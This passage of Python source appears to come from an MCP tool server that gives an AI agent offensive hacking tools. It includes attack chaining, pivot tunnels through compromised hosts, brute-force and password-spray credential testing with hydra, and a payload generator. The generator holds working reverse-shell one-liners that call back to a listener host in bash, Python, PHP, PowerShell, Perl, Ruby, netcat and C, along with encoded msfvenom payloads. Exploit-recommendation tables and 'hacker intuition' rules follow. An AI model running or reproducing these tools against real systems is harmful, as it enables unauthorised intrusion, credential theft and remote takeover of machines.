            step_result["status"] = "failed"
            step_result["error"] = str(e)
            failures += 1
            
            if verbose:
                lines.append(f"   ❌ Failed: {e}")
        
        state_data["steps"].append(step_result)
        
        # Update phase state
        if "update_state" in step:
            _update_state_for_chain(target, step["update_state"], step_result)
        
        # Check max failures
        if failures >= max_failures:
            lines.append(f"\n⚠️  Stopped after {max_failures} consecutive failures")
            break
        
        if verbose:
            lines.append("")
    
    # Finalize
    state_data["completed"] = datetime.utcnow().isoformat() + "Z"
    state_data["summary"] = {
        "total_steps": len(chain_def["steps"]),
        "success": success,
        "failures": failures,
        "duration_s": time.time() - t0
    }
    
    # Save chain state
    _save_chain_state(target, name, state_data)
    
    lines.append(f"\n📊 Chain Summary:")
    lines.append(f"   Total steps: {len(chain_def['steps'])}")
    lines.append(f"   Success: {success}")
    lines.append(f"   Failures: {failures}")
    lines.append(f"   Duration: {time.time() - t0:.1f}s")
    
    _audit("chain", "completed", target, f"chain={name} success={success} failures={failures}")
    return "\n".join(lines)


def _call_recon(action: str, target: str, options: str = "") -> str:
    """Call recon tool internally."""
    if action == "http":
        return http_probe(target)
    elif action == "ports":
        return port_scan(target, options or "1-1024")
    elif action == "dns_enum":
        return dns_enum(target)
    elif action == "subdomains":
        return subdomain_enum(target)
    else:
        return f"Unknown recon action: {action}"


def _call_execute(tool: str, args: str) -> str:
    """Call execute tool internally."""
    return run_tool(tool, args, target="", purpose="", timeout=300)


def _update_state_for_chain(target: str, update: dict, step_result: dict) -> None:
    """Update state based on chain step results."""
    try:
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        state = {}
        if state_file.exists():
            state = json.loads(state_file.read_text())
        
        if "phase" in update:
            state["phase"] = update["phase"]
        
        if "discovered" in update:
            if "discovered" not in state:
                state["discovered"] = {}
            state["discovered"].update(update["discovered"])
        
        if step_result.get("status") == "success":
            if "attempted" not in state:
                state["attempted"] = []
            state["attempted"].append({
                "technique": step_result.get("name", ""),
                "result": "success",
                "timestamp": datetime.utcnow().isoformat() + "Z"
            })
        
        state["updated"] = datetime.utcnow().isoformat() + "Z"
        state_file.write_text(json.dumps(state, indent=2))
    except Exception:
        pass


def _save_chain_state(target: str, chain_name: str, state_data: dict) -> None:
    """Save chain execution state."""
    try:
        chain_dir = STATE_DIR / "chains"
        chain_dir.mkdir(parents=True, exist_ok=True)
        chain_file = chain_dir / f"{target.replace('/', '_').replace(':', '_')}_{chain_name}.json"
        chain_file.write_text(json.dumps(state_data, indent=2))
    except Exception:
        pass


# --------------------------------------------------------------------------- #
# Phase 2: Pivot Tool
# --------------------------------------------------------------------------- #
@mcp.tool()
def pivot(action: str = "list", target: str = "", pivot_host: str = "", 
          pivot_port: int = 22, pivot_user: str = "", pivot_pass: str = "",
          pivot_key: str = "", tunnel_port: int = 8080, remote_target: str = "") -> str:
    """Manage pivot tunnels for scanning through compromised hosts.
    
    Actions:
      list       show all active pivots
      ssh_tunnel create SSH tunnel through a pivot host
      socks      create SOCKS proxy through pivot
      scan       scan remote network through pivot
      close      close a pivot tunnel
    
    Args:
      action: list | ssh_tunnel | socks | scan | close
      target: local target or pivot host
      pivot_host: SSH host to pivot through
      pivot_port: SSH port (default 22)
      pivot_user: SSH username
      pivot_pass: SSH password
      pivot_key: path to SSH key
      tunnel_port: local port to bind tunnel
      remote_target: target to scan through pivot
    """
    t0 = time.time()
    a = (action or "list").lower().strip()
    
    pivots_file = STATE_DIR / "pivots.json"
    
    if a == "list":
        if not pivots_file.exists():
            _audit("pivot", "list", "", "no pivots")
            return "No active pivots."
        
        try:
            pivots = json.loads(pivots_file.read_text())
        except Exception:
            return "Error reading pivots."
        
        if not pivots:
            _audit("pivot", "list", "", "no pivots")
            return "No active pivots."
        
        lines = ["🔄 Active Pivots"]
        for p in pivots:
            lines.append(f"\n🔗 {p.get('id', 'unknown')}")
            lines.append(f"   Type: {p.get('type', 'unknown')}")
            lines.append(f"   Pivot: {p.get('pivot_host', '')}:{p.get('pivot_port', '')}")
            lines.append(f"   Local: localhost:{p.get('local_port', '')}")
            lines.append(f"   Remote: {p.get('remote_target', '')}")
            lines.append(f"   Created: {p.get('created', '')}")
        
        _audit("pivot", "list", "", f"total={len(pivots)}")
        return "\n".join(lines)
    
    if a == "ssh_tunnel":
        if not pivot_host or not pivot_user:
            return "pivot_host and pivot_user required for ssh_tunnel"
        
        # Create SSH tunnel
        cmd = [
            "ssh", "-N", "-L", f"{tunnel_port}:localhost:{pivot_port}",
            f"{pivot_user}@{pivot_host}"
        ]
        
        if pivot_pass:
            cmd.extend(["-o", "PasswordAuthentication=yes", "-o", f"IdentityFile={pivot_key}"])
        elif pivot_key:
            cmd.extend(["-i", pivot_key])
        
        # Store pivot info
        pivot_id = f"ssh_{pivot_host}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
        pivot_data = {
            "id": pivot_id,
            "type": "ssh_tunnel",
            "pivot_host": pivot_host,
            "pivot_port": pivot_port,
            "pivot_user": pivot_user,
            "local_port": tunnel_port,
            "remote_target": remote_target,
            "created": datetime.utcnow().isoformat() + "Z",
            "command": " ".join(cmd)
        }
        
        pivots = []
        if pivots_file.exists():
            try:
                pivots = json.loads(pivots_file.read_text())
            except Exception:
                pivots = []
        
        pivots.append(pivot_data)
        pivots_file.write_text(json.dumps(pivots, indent=2))
        
        _audit("pivot", "ssh_tunnel", pivot_host, f"local_port={tunnel_port}")
        return (f"🔗 SSH Tunnel Created:\n"
                f"   ID: {pivot_id}\n"
                f"   Command: {' '.join(cmd)}\n"
                f"   Local: localhost:{tunnel_port} → {pivot_host}:{pivot_port}\n"
                f"   Run the command above to start the tunnel")
    
    if a == "socks":
        if not pivot_host or not pivot_user:
            return "pivot_host and pivot_user required for socks"
        
        # Create SOCKS proxy using ssh -D
        cmd = [
            "ssh", "-D", f"localhost:{tunnel_port}",
            "-q", f"{pivot_user}@{pivot_host}"
        ]
        
        if pivot_key:
            cmd.extend(["-i", pivot_key])
        
        pivot_id = f"socks_{pivot_host}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
        pivot_data = {
            "id": pivot_id,
            "type": "socks",
            "pivot_host": pivot_host,
            "pivot_port": pivot_port,
            "pivot_user": pivot_user,
            "local_port": tunnel_port,
            "remote_target": remote_target,
            "created": datetime.utcnow().isoformat() + "Z",
            "command": " ".join(cmd)
        }
        
        pivots = []
        if pivots_file.exists():
            try:
                pivots = json.loads(pivots_file.read_text())
            except Exception:
                pivots = []
        
        pivots.append(pivot_data)
        pivots_file.write_text(json.dumps(pivots, indent=2))
        
        _audit("pivot", "socks", pivot_host, f"local_port={tunnel_port}")
        return (f"🔗 SOCKS Proxy Created:\n"
                f"   ID: {pivot_id}\n"
                f"   Command: {' '.join(cmd)}\n"
                f"   Local: socks5://localhost:{tunnel_port}\n"
                f"   Use with proxychains or set HTTP_PROXY/HTTPS_PROXY")
    
    if a == "scan":
        if not remote_target:
            return "remote_target required for scan"
        
        # Scan through pivot using proxychains
        cmd = [
            "proxychains", "nmap", "-sV", "-T4",
            remote_target
        ]
        
        code, output = _run(cmd, timeout=300)
        
        _audit("pivot", "scan", remote_target, f"exit={code}")
        return f"$ {' '.join(cmd)}\n\n{output}"
    
    if a == "close":
        if not target:
            return "target (pivot ID) required for close"
        
        pivots = []
        if pivots_file.exists():
            try:
                pivots = json.loads(pivots_file.read_text())
            except Exception:
                pivots = []
        
        original_len = len(pivots)
        pivots = [p for p in pivots if p.get("id") != target]
        
        if len(pivots) < original_len:
            pivots_file.write_text(json.dumps(pivots, indent=2))
            _audit("pivot", "close", target, "closed")
            return f"✅ Closed pivot: {target}"
        else:
            _audit("pivot", "close", target, "not found", ok=False)
            return f"❌ Pivot not found: {target}"
    
    return f"unknown action '{action}' — use list, ssh_tunnel, socks, scan, or close"


# --------------------------------------------------------------------------- #
# Phase 2: Adaptive Reasoning Helper
# --------------------------------------------------------------------------- #
@mcp.tool()
def adapt(technique: str = "", result: str = "success", reason: str = "", 
          target: str = "", recommendation: str = "") -> str:
    """Record adaptive learning from attack results.
    
    Args:
      technique: technique/exploit that was tried
      result: success | failed | partial
      reason: why it succeeded/failed (WAF, rate limit, version mismatch, etc.)
      target: target for context
      recommendation: what to try next based on this result
    """
    t0 = time.time()
    
    learn_file = STATE_DIR / "learning.json"
    learning = []
    
    if learn_file.exists():
        try:
            learning = json.loads(learn_file.read_text())
        except Exception:
            learning = []
    
    learning.append({
        "technique": technique,
        "result": result,
        "reason": reason,
        "target": target,
        "recommendation": recommendation,
        "timestamp": datetime.utcnow().isoformat() + "Z"
    })
    
    learn_file.write_text(json.dumps(learning, indent=2))
    
    _audit("adapt", "recorded", target, f"technique={technique} result={result}")
    
    # Generate recommendation if not provided
    if not recommendation:
        recommendations = {
            ("WAF", "failed"): "Try encoded payloads (base64, hex, URL encoding)",
            ("rate_limit", "failed"): "Slow down requests or use different source IP",
            ("version_mismatch", "failed"): "Search for alternative exploits for same CVE",
            ("auth_required", "failed"): "Try credential brute force or find auth bypass",
            ("timeout", "failed"): "Try simpler/smaller payload or increase timeout",
        }
        
        key = (reason.lower(), result.lower())
        if key in recommendations:
            recommendation = recommendations[key]
            learning[-1]["recommendation"] = recommendation
            learn_file.write_text(json.dumps(learning, indent=2))
    
    return f"🧠 Adaptive learning recorded:\n" \
           f"   Technique: {technique}\n" \
           f"   Result: {result}\n" \
           f"   Reason: {reason}\n" \
           f"   Recommendation: {recommendation or 'Continue with next technique'}"


# --------------------------------------------------------------------------- #
# Phase 2: Payload Generator
# --------------------------------------------------------------------------- #
@mcp.tool()
def payload(action: str = "generate", language: str = "bash", lhost: str = "", 
            lport: int = 4444, encoder: str = "", format_: str = "raw",
            output: str = "", platform: str = "linux", arch: str = "x64") -> str:
    """Generate reverse shell payloads or encode with msfvenom.
    
    Actions:
      generate   create reverse shell payload (bash, python, php, powershell, java)
      msfvenom   use msfvenom to generate encoded payload
      encode     encode payload (base64, hex, shell_escape)
    
    Args:
      action: generate | msfvenom | encode
      language: shell language (bash, python, php, powershell, java, c)
      lhost: listener IP
      lport: listener port
      encoder: msfvenom encoder (e.g., x86/shikata_ga_nai)
      format_: output format (raw, elf, exe, php, asp, js, etc.)
      output: output file path
      platform: target platform (linux, windows, darwin)
      arch: target architecture (x86, x64, arm)
    """
    t0 = time.time()
    a = (action or "generate").lower().strip()
    
    # Reverse shell templates
    shells = {
        "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_simple": "/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "python": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])",
        "python_one": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        "php": "<?php $sock=fsockopen('{lhost}',{lport});exec('/bin/bash -i <&3 >&3 2>&3'); ?>",
        "powershell": "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        "java": "r=new ProcessBuilder(\"cmd\",\"/c\",\"netsh interface show interface\");r.redirectErrorStream(true);Process p=r.start();r=new BufferedReader(new InputStreamReader(p.getInputStream()));while(r.ready())System.out.print(r.readLine());",
        "perl": "exec 'perl -e \'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\'}'\"",
        "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
        "netcat": "nc -e /bin/bash {lhost} {lport}",
        "netcat_openbsd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "c": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n\nint main(){\n  int sock, port={lport};\n  struct sockaddr_in addr;\n  sock=socket(AF_INET,SOCK_STREAM,0);\n  addr.sin_family=AF_INET;\n  addr.sin_port=htons(port);\n  addr.sin_addr.s_addr=inet_addr(\"{lhost}\");\n  connect(sock,(struct sockaddr*)&addr,sizeof(addr));\n  dup2(sock,0);dup2(sock,1);dup2(sock,2);\n  system(\"/bin/sh\");\n  return 0;\n}"
    }
    
    if a == "generate":
        lang = (language or "bash").lower().strip()
        
        if lang not in shells:
            return f"Unknown language '{lang}'. Available: {', '.join(shells.keys())}"
        
        if not lhost:
            return "lhost required for payload generation"
        
        template = shells[lang]
        payload_str = template.replace("{lhost}", lhost).replace("{lport}", str(lport))
        
        lines = [f"🔧 {lang.upper()} Reverse Shell Payload",
                 f"   LHOST: {lhost}",
                 f"   LPORT: {lport}",
                 f"   Platform: {platform}",
                 f"   Arch: {arch}",
                 "",
                 "```", payload_str, "```"]
        
        _audit("payload", "generated", "", f"lang={lang} lhost={lhost}")
        return "\n".join(lines)
    
    if a == "msfvenom":
        if not lhost:
            return "lhost required for msfvenom"
        
        # Build msfvenom command
        cmd = ["msfvenom"]
        
        # Select payload based on platform
        payload_map = {
            "linux": "linux/x64/shell_reverse_tcp",
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "darwin": "osx/x64/shell_reverse_tcp"
        }
        payload_name = payload_map.get(platform, "linux/x64/shell_reverse_tcp")
        cmd.extend(["-p", payload_name, "LHOST=" + lhost, "LPORT=" + str(lport)])
        
        # Add format
        fmt = format_.lower()
        if fmt:
            cmd.extend(["-f", fmt])
        
        # Add encoder
        if encoder:
            cmd.extend(["-e", encoder, "-i", "3"])  # 3 iterations default
        
        # Add output
        if output:
            cmd.extend(["-o", output])
        else:
            output = f"/tmp/opencode/shell_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
            cmd.extend(["-o", output])
        
        code, result = _run(cmd, timeout=60)
        
        if code == 0:
            _audit("payload", "msfvenom", "", f"output={output}")
            return f"✅ Payload generated successfully\n   Output: {output}\n   Command: {' '.join(cmd)}"
        else:
            _audit("payload", "msfvenom_error", "", result, ok=False)
            return f"❌ msfvenom failed:\n{result}"
    
    if a == "encode":
        if not language:
            return "payload content required (use generate first)"
        
        # Encode the payload
        if encoder == "base64":
            encoded = base64.b64encode(language.encode()).decode()
            decode_cmd = "echo '" + encoded + "' | base64 -d"
        elif encoder == "hex":
            encoded = language.encode().hex()
            decode_cmd = "echo '" + encoded + "' | xxd -r -p"
        elif encoder == "url":
            encoded = urllib.parse.quote(language, safe="")
            decode_cmd = "python3 -c \"import urllib.parse; print(urllib.parse.unquote('" + encoded + "'))\""
        else:
            encoded = language
            decode_cmd = language
        
        _audit("payload", "encoded", "", f"encoder={encoder}")
        return f"🔐 Encoded Payload:\n   Encoder: {encoder or 'none'}\n   \n   {encoded}\n   \n   Decode: {decode_cmd}"
    
    return f"unknown action '{action}' — use generate, msfvenom, or encode"


# --------------------------------------------------------------------------- #
# Phase 2: Auto-Credential Tester
# --------------------------------------------------------------------------- #
@mcp.tool()
def creds(action: str = "test", target: str = "", service: str = "", 
          username: str = "", password: str = "", wordlist: str = "",
          port: int = 22, batch_size: int = 10) -> str:
    """Test credentials against services automatically.
    
    Actions:
      test       test single credential pair
      brute      brute force with wordlist
      spray      password spray (one password, multiple users)
      discovered test all discovered creds against all services
    
    Args:
      action: test | brute | spray | discovered
      target: target host
      service: service type (ssh, smb, ftp, mysql, postgres, redis, etc.)
      username: username to test
      password: password to test
      wordlist: path to wordlist file
      port: service port
      batch_size: credentials to test per batch
    """
    t0 = time.time()
    a = (action or "test").lower().strip()
    
    if not target:
        return "target required"
    
    # Service configurations
    services = {
        "ssh": {"port": 22, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} ssh://{target}:{port}"},
        "smb": {"port": 445, "tool": "netexec", "args": "smb {target} -u {user} -p '{pass}'"},
        "ftp": {"port": 21, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} ftp://{target}:{port}"},
        "mysql": {"port": 3306, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} mysql://{target}:{port}"},
        "postgres": {"port": 5432, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} postgres://{target}:{port}"},
        "redis": {"port": 6379, "tool": "redis-cli", "args": "-h {target} -p {port} -a {pass} PING"},
        "rdp": {"port": 3389, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} rdps://{target}:{port}"},
        "telnet": {"port": 23, "tool": "hydra", "args": "-l {user} -P {pass_or_wordlist} telnet://{target}:{port}"},
    }
    
    if a == "test":
        if not username or not password:
            return "username and password required for test"
        
        svc = (service or "ssh").lower().strip()
        if svc not in services:
            return f"Unknown service '{svc}'. Available: {', '.join(services.keys())}"
        
        svc_config = services[svc]
        port = port or svc_config["port"]
        
        # Build command based on tool
        if svc_config["tool"] == "hydra":
            cmd = ["hydra", "-L", "-", "-l", username, "-P", "-", 
                   svc_config["args"].replace("{user}", username).replace("{pass_or_wordlist}", "-").replace("{target}", target).replace("{port}", str(port))]
            # This is simplified - actual hydra usage would be different
            cmd = ["hydra", "-l", username, "-p", password, 
                   f"{svc}://{target}:{port}", "-t", "4"]
        elif svc_config["tool"] == "netexec":
            cmd = ["netexec", "smb", target, "-u", username, "-p", password]
        elif svc_config["tool"] == "redis-cli":
            cmd = ["redis-cli", "-h", target, "-p", str(port), "-a", password, "PING"]
        else:
            cmd = [svc_config["tool"]]
        
        code, output = _run(cmd, timeout=60)
        
        # Check for success indicators
        success = any(ind in output.lower() for ind in ["success", "login", "password", "accepted", "pong"])
        
        _audit("creds", "test", target, f"service={svc} user={username} success={success}")
        
        if success:
            # Save successful credential
            loot(action="add", target=target, loot_type="credential",
                 name=f"{svc}_{username}", content=f"{username}:{password}",
                 path=f"{svc}://{target}:{port}")
            return f"✅ SUCCESS!\n   Target: {target}\n   Service: {svc}\n   Username: {username}\n   Password: {password}\n   {output}"
        else:
            return f"❌ Failed\n   Target: {target}\n   Service: {svc}\n   Username: {username}\n   {output}"
    
    if a == "brute":
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt"
        
        svc = (service or "ssh").lower().strip()
        if svc not in services:
            return f"Unknown service '{svc}'. Available: {', '.join(services.keys())}"
        
        port = port or services[svc]["port"]
        
        cmd = ["hydra", "-l", username or "admin", "-P", wordlist,
               f"{svc}://{target}:{port}", "-t", "16", "-I"]
        
        code, output = _run(cmd, timeout=300)
        
        _audit("creds", "brute", target, f"service={svc} wordlist={wordlist}")
        return f"$ {' '.join(cmd)}\n\n{output}"
    
    if a == "spray":
        if not password:
            return "password required for spray"
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/users.txt"
        
        svc = (service or "ssh").lower().strip()
        if svc not in services:
            return f"Unknown service '{svc}'. Available: {', '.join(services.keys())}"
        
        port = port or services[svc]["port"]
        
        cmd = ["hydra", "-L", wordlist, "-p", password,
               f"{svc}://{target}:{port}", "-t", "16", "-I"]
        
        code, output = _run(cmd, timeout=300)
        
        _audit("creds", "spray", target, f"service={svc} password={password}")
        return f"$ {' '.join(cmd)}\n\n{output}"
    
    if a == "discovered":
        # Get discovered creds from state
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        if not state_file.exists():
            return f"No state found for {target}"
        
        try:
            state_data = json.loads(state_file.read_text())
        except Exception:
            return "Error reading state"
        
        creds_list = state_data.get("discovered", {}).get("creds", [])
        if not creds_list:
            return "No discovered credentials in state"
        
        results = []
        for cred in creds_list[:batch_size]:
            user = cred.get("user", "")
            pass_ = cred.get("pass", "")
            
            if not user or not pass_:
                continue
            
            # Test against common services
            for svc in ["ssh", "smb", "ftp"]:
                if svc in services:
                    port = services[svc]["port"]
                    result = creds(action="test", target=target, service=svc,
                                  username=user, password=pass_, port=port)
                    if "SUCCESS" in result:
                        results.append(result)
        
        if results:
            return "\n\n".join(results)
        else:
            return f"No successful credentials found (tested {min(len(creds_list), batch_size)} creds)"
    
    return f"unknown action '{action}' — use test, brute, spray, or discovered"


# --------------------------------------------------------------------------- #
# Phase 2: Backtracking Helper
# --------------------------------------------------------------------------- #
@mcp.tool()
def backtrack(target: str = "", technique: str = "", reason: str = "", 
              alternatives: str = "") -> str:
    """Try alternative techniques when current approach fails.
    
    Args:
      target: target host
      technique: technique that failed
      reason: why it failed
      alternatives: JSON list of alternative techniques to try
    
    Returns recommended next steps based on failure analysis.
    """
    t0 = time.time()
    
    # Alternative technique mappings
    alternatives_db = {
        "CVE-2021-41773": [
            {"name": "CVE-2021-42013", "type": "cve", "description": "Apache 2.4.49-2.4.51 Server-Side Request Forgery"},
            {"name": "CVE-2021-41773_encoded", "type": "exploit", "description": "Same CVE with URL-encoded payload"},
            {"name": "dir_brute", "type": "enumeration", "description": "Brute force directories"},
        ],
        "ssh_brute": [
            {"name": "ssh_enum", "type": "enumeration", "description": "Enumerate SSH users"},
            {"name": "ssh_weak_key", "type": "exploit", "description": "Check for weak SSH keys"},
            {"name": "credential_spray", "type": "auth", "description": "Try common passwords across users"},
        ],
        "smb_brute": [
            {"name": "smb_null", "type": "auth", "description": "Try null session"},
            {"name": "smb_enum", "type": "enumeration", "description": "Enumerate SMB shares"},
            {"name": "MS17-010", "type": "cve", "description": "EternalBlue exploit"},
        ],
        "web_vuln": [
            {"name": "sqlmap", "type": "injection", "description": "Test for SQL injection"},
            {"name": "xsser", "type": "injection", "description": "Test for XSS"},
            {"name": "cmdi", "type": "injection", "description": "Test for command injection"},
            {"name": "ssrf", "type": "injection", "description": "Test for SSRF"},
        ],
    }
    
    tech_lower = technique.lower() if technique else ""
    
    # Find matching alternatives
    recommended = []
    for key, alts in alternatives_db.items():
        if key in tech_lower or tech_lower in key:
            recommended.extend(alts)
    
    # Add generic alternatives if none found
    if not recommended:
        recommended = [
            {"name": "searchsploit", "type": "research", "description": f"Search for exploits for {technique or 'target'}"},
            {"name": "dir_brute", "type": "enumeration", "description": "Brute force directories/files"},
            {"name": "subdomain_enum", "type": "enumeration", "description": "Find more subdomains"},
            {"name": "port_scan_full", "type": "recon", "description": "Full port scan (1-65535)"},
        ]
    
    # Record in learning
    if technique and reason:
        adapt(technique=technique, result="failed", reason=reason, target=target)
    
    lines = [f"🔄 Backtracking for: {technique or 'current technique'}"]
    if reason:
        lines.append(f"   Reason: {reason}")
    lines.append(f"   Target: {target}")
    lines.append(f"\n   📋 Recommended alternatives ({len(recommended)}):")
    
    for i, alt in enumerate(recommended[:10], 1):
        lines.append(f"   {i}. {alt['name']} ({alt['type']})")
        lines.append(f"      {alt['description']}")
    
    _audit("backtrack", "recommended", target, f"technique={technique} alternatives={len(recommended)}")
    
    return "\n".join(lines)


# --------------------------------------------------------------------------- #
# Phase 3: Learning System - Success Rate Tracking
# --------------------------------------------------------------------------- #
@mcp.tool()
def learn(action: str = "record", technique: str = "", result: str = "success",
          target: str = "", service: str = "", version: str = "",
          reason: str = "", payload: str = "", time_taken: float = 0.0) -> str:
    """Record attack results for cross-session learning.
    
    Actions:
      record    record a technique result
      stats     get success rates for techniques
      similar   find similar targets and what worked
      forget    remove a learning entry
    
    Args:
      action: record | stats | similar | forget
      technique: technique/exploit name (CVE, tool, method)
      result: success | failed | partial
      target: target host
      service: service name (Apache, SSH, WordPress, etc.)
      version: service version
      reason: why it succeeded/failed
      payload: payload that worked (optional)
      time_taken: seconds to complete
    """
    t0 = time.time()
    a = (action or "record").lower().strip()
    
    learn_file = STATE_DIR / "learnings.json"
    learnings = []
    
    if learn_file.exists():
        try:
            learnings = json.loads(learn_file.read_text())
        except Exception:
            learnings = []
    
    if a == "record":
        if not technique:
            return "technique required for record"
        
        learning_entry = {
            "id": hashlib.md5(f"{technique}{target}{datetime.utcnow().isoformat()}".encode()).hexdigest()[:12],
            "technique": technique,
            "result": result,
            "target": target,
            "service": service,
            "version": version,
            "reason": reason,
            "payload": payload,
            "time_taken": time_taken,
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }
        
        learnings.append(learning_entry)
        learn_file.write_text(json.dumps(learnings, indent=2))
        
        _audit("learn", "recorded", target, f"technique={technique} result={result}")
        
        return f"✅ Learning recorded:\n" \
               f"   Technique: {technique}\n" \
               f"   Result: {result}\n" \
               f"   Service: {service or 'N/A'} {version or ''}\n" \
               f"   Reason: {reason or 'N/A'}\n" \
               f"   Total learnings: {len(learnings)}"
    
    if a == "stats":
        # Calculate success rates
        stats = {}
        for l in learnings:
            tech = l.get("technique", "unknown")
            result = l.get("result", "unknown")
            
            if tech not in stats:
                stats[tech] = {"total": 0, "success": 0, "failed": 0, "partial": 0}
            
            stats[tech]["total"] += 1
            if result == "success":
                stats[tech]["success"] += 1
            elif result == "failed":
                stats[tech]["failed"] += 1
            elif result == "partial":
                stats[tech]["partial"] += 1
        
        # Calculate percentages and sort by success rate
        ranked = []
        for tech, counts in stats.items():
            if counts["total"] > 0:
                success_rate = (counts["success"] / counts["total"]) * 100
                ranked.append({
                    "technique": tech,
                    "success_rate": success_rate,
                    **counts
                })
        
        ranked.sort(key=lambda x: x["success_rate"], reverse=True)
        
        lines = ["📊 Technique Success Rates"]
        lines.append(f"   Total learnings: {len(learnings)}")
        lines.append("")
        
        if ranked:
            lines.append("   Rank | Technique | Success Rate | Total | Success | Failed")
            lines.append("   " + "-" * 70)
            for i, r in enumerate(ranked[:20], 1):
                lines.append(f"   {i:4} | {r['technique'][:25]:25} | {r['success_rate']:12.1f}% | {r['total']:5} | {r['success']:7} | {r['failed']}")
        else:
            lines.append("   No data yet.")
        
        _audit("learn", "stats", "", f"total={len(learnings)}")
        return "\n".join(lines)
    
    if a == "similar":
        if not service and not version:
            return "service or version required for similar search"
        
        # Find similar service/version combinations and what worked
        matches = []
        for l in learnings:
            if l.get("result") != "success":
                continue
            
            l_service = l.get("service", "").lower()
            l_version = l.get("version", "")
            
            # Match by service
            if service and service.lower() in l_service or l_service in service.lower():
                matches.append(l)
            # Match by version
            elif version and version in l_version or l_version in version:
                matches.append(l)
        
        lines = [f"🔍 Similar Targets ({len(matches)} matches)"]
        
        if matches:
            lines.append("   Technique | Service | Version | Reason")
            lines.append("   " + "-" * 60)
            for m in matches[:15]:
                lines.append(f"   {m.get('technique', '')[:20]:20} | {m.get('service', '')[:12]:12} | {m.get('version', ''):10} | {m.get('reason', '')[:15]}")
            
            # Recommend top techniques
            technique_counts = {}
            for m in matches:
                tech = m.get("technique", "")
                technique_counts[tech] = technique_counts.get(tech, 0) + 1
            
            if technique_counts:
                top_techniques = sorted(technique_counts.items(), key=lambda x: x[1], reverse=True)
                lines.append("")
                lines.append("   🎯 Recommended techniques (by frequency):")
                for tech, count in top_techniques[:5]:
                    lines.append(f"      • {tech} (worked {count} times)")
        else:
            lines.append("   No similar successful attacks found.")
        
        _audit("learn", "similar", "", f"service={service} matches={len(matches)}")
        return "\n".join(lines)
    
    if a == "forget":
        if not technique:
            return "technique required for forget"
        
        original_len = len(learnings)
        learnings = [l for l in learnings if l.get("technique") != technique]
        
        if len(learnings) < original_len:
            learn_file.write_text(json.dumps(learnings, indent=2))
            _audit("learn", "forgotten", "", f"technique={technique}")
            return f"✅ Removed {original_len - len(learnings)} entries for '{technique}'"
        
        return f"❌ No entries found for '{technique}'"
    
    return f"unknown action '{action}' — use record, stats, similar, or forget"


# --------------------------------------------------------------------------- #
# Phase 3: Hacker Intuition Database
# --------------------------------------------------------------------------- #
@mcp.tool()
def intuition(action: str = "query", service: str = "", version: str = "",
              context: str = "", confidence: float = 0.7) -> str:
    """Query the hacker intuition database for likely vulnerabilities.
    
    Actions:
      query     get likely vulns for a service/version
      add       add a new intuition rule
      remove    remove an intuition rule
      list      list all intuition rules
    
    Args:
      action: query | add | remove | list
      service: service name (Apache, Nginx, WordPress, etc.)
      version: service version
      context: additional context (WAF, OS, config)
      confidence: minimum confidence threshold (0.0-1.0)
    """
    t0 = time.time()
    a = (action or "query").lower().strip()
    
    intuition_file = STATE_DIR / "intuition.json"
    intuitions = []
    
    # Default intuition rules (hacker knowledge)
    default_intuitions = [
        {"service": "apache", "version_pattern": "2.4.4[9]|2.4.5[01]", 
         "technique": "CVE-2021-41773", "confidence": 0.85, "description": "Apache Path Traversal"},
        {"service": "apache", "version_pattern": "2.4.[0-3]|2.2",
         "technique": "CVE-2021-40438", "confidence": 0.75, "description": "Apache Path Traversal (older)"},
        {"service": "nginx", "version_pattern": "1.2[0-5]",
         "technique": "CVE-2021-23017", "confidence": 0.70, "description": "Nginx Zero-Conf RCE"},
        {"service": "wordpress", "version_pattern": "5\\.[0-7]",
         "technique": "wp-scanner", "confidence": 0.80, "description": "WordPress vulnerability scan"},
        {"service": "wordpress", "version_pattern": "",
         "technique": "wp-login-brute", "confidence": 0.60, "description": "WordPress login brute force"},
        {"service": "ssh", "version_pattern": "",
